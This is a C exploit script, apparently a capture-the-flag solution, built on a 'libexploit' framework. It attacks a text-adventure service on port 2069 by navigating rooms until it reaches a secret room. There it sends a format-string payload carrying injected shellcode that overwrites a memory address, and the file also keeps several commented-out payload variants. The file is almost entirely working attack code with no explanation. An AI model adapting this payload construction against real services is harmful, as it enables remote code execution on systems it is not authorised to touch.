#include <sys/types.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#include <libexploit/libexploit.h>

int e_port = 2069;

unsigned int e_brute_min = 0;
unsigned int e_brute_max = 20;
unsigned int e_brute_parallel = 1;

volatile const char e_bad_bytes[] = { 0x00, 0x0A, 0x25, 0x58 };
volatile const size_t e_bad_bytes_len = sizeof(e_bad_bytes);


int recievestatus(databuf_t *db)
{
	er_databuf_clear(db);

	erd_io_read_until(db, "> \n");
	e_hexdump(db);
	fprintf(stderr, "[+] read status\n");

	return 0;
}



int recievestatus2(databuf_t *db)
{
	er_databuf_clear(db);

	do {
		erd_io_read(db, 1);
		e_hexdump(db);
	} while (!strstr(db->data, "now..."));

	//erd_io_read_until(db, "please!\n");
	fprintf(stderr, "[+] read status2\n");

	return 0;
}



int isGoldRoom(databuf_t *db)
{
	return strstr(db->data, "pieces of gold") ? 1 : 0;
}



int isFormatStringRoom(databuf_t *data)
{
	return strstr(data->data, "anything around") ? 1 : 0;
}


int sendcommand(char cmd)
{
	erd_io_write_buf(&cmd, 1);
	return 0;
}



int go(char dir)
{
	E_DATABUF_AUTO( db );

	/* use hammer */
fprintf(stderr, "ok %d\n", __LINE__);
	CHECKED_R( sendcommand('h') );
fprintf(stderr, "ok %d\n", __LINE__);
	CHECKED_R( recievestatus2(db) );
fprintf(stderr, "ok %d\n", __LINE__);

	/* break wall */
fprintf(stderr, "ok %d\n", __LINE__);
	CHECKED_R( sendcommand(dir) );
fprintf(stderr, "ok %d\n", __LINE__);
	CHECKED_R( recievestatus(db) );
fprintf(stderr, "ok %d\n", __LINE__);

	/* go to next room */
fprintf(stderr, "ok %d\n", __LINE__);
	CHECKED_R( sendcommand(dir) );
fprintf(stderr, "ok %d\n", __LINE__);

	return 0;
}



int try_to_pick_up_sledge(databuf_t *db, int *got_it)
{
	char *p, *q;
	E_DATABUF_AUTO( line );

	for (;;) {
		if (!(p = strstr(db->data, "You can see:"))) return 0;
		if (!(q = strstr(p, "\n"))) return 0;
		while (p < q) {
			er_databuf_append(line, p++, 1);
		}
		if (!strstr(line->data, "sledge")) return 0;

		erd_io_write_buf("g", 1);
		CHECKED_R( recievestatus(db) );

		er_databuf_clear(line);
		if (!(p = strstr(db->data, "You are carrying:"))) return 0;
		if (!(q = strstr(p, "\n"))) return 0;
		while (p < q) {
			er_databuf_append(line, p++, 1);
		}

		if (!strstr(line->data, "sledge")) continue;

		*got_it = 1;

		erd_io_write_buf("a", 1);
		CHECKED_R( recievestatus(db) );

		break;
	}

	return 0;
}



int send_format_exploit(databuf_t *db, char dir)
{
	//char *fmt = "\xCC\xCC\xCC\xCC""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAt%134524464x%13$nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX\n";
	//char *fmt = "\xCC\xCC\xCC\xCC""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%134524464x%13$nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX\n";
	//char *fmt = "BBBBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX\n";

	struct {
		char buf[124];
		uint32_t addr;
		char str[16];
		char padding[256+256-26-120-1];
		char delim[2];
		char term;
	} __attribute__((packed)) fmt;

	memset(fmt.buf, 'B', sizeof(fmt.buf));
	//fmt.buf[0] = '\xCC';
	memcpy(fmt.buf, e_payload->data, e_payload->length);
	fmt.addr = 0x0804D374;
	strcpy(fmt.str, "%134524384x%33$n");
	memset(fmt.padding, 'A', sizeof(fmt.padding));
	strcpy(fmt.delim, "X\n");

	//char *fmt = "\xCC\xCC\xCC\xCC""AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%134524464x%13$nAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAX\n";

	fprintf(stderr, "Will write fmt [%s]\n", (char*)&fmt);
	erd_io_write_buf((char*)&fmt, strlen((char*)&fmt));
	fprintf(stderr, "ok\n");

	while (!strchr(db->data, 'X')) {
		e_hexdump(db);
fprintf(stderr, "ok %d\n", __LINE__);
		go(dir);
fprintf(stderr, "ok %d\n", __LINE__);
		recievestatus(db);
fprintf(stderr, "ok %d\n", __LINE__);
	}
	fprintf(stderr, "[+] got X\n");

	for (;;) {
		CHECKED_R( sendcommand('g') );
		CHECKED_R( recievestatus(db) );
		e_hexdump(db);
		if (strstr(db->data, "X\n_n")) {
			er_databuf_clear(db);
			CHECKED_R( sendcommand('a') );			
			fprintf(stderr, "[+] sploited!\n");
			//for (;;) {
				erd_io_read(db, 12);
				e_hexdump(db);
			//}
			return 0;
		}
	}

	/* never reached */
	return -1;
}



int e_exploit(unsigned int brute)
{
	E_DATABUF_AUTO( db );
	int equipped_with_sledge = 0;
	char *directions = "nesswwnnwssseee";
	int i;

	//getchar();
	sleep(1);

	for (i=0; i<14; i++) {

		fprintf(stderr, "[*] equipped_with_sledge = %d\n", equipped_with_sledge);

		CHECKED_R( recievestatus(db) );
		//e_hexdump(db);

		if (isGoldRoom(db)) {
			fprintf(stderr, "[-] isGoldRoom\n");
			return -1;
		}

		if (isFormatStringRoom(db)) {
			fprintf(stderr, "[+] Found secret room!\n");
			CHECKED_R( send_format_exploit(db, directions[i]) );
			return 0;
		}

		if (!equipped_with_sledge) {
			CHECKED_R( try_to_pick_up_sledge(db, &equipped_with_sledge) );
		}

		CHECKED_R( go(directions[i]) );
	}

	fprintf(stderr, "[-] secret room not found :(\n");
	return -1;
}
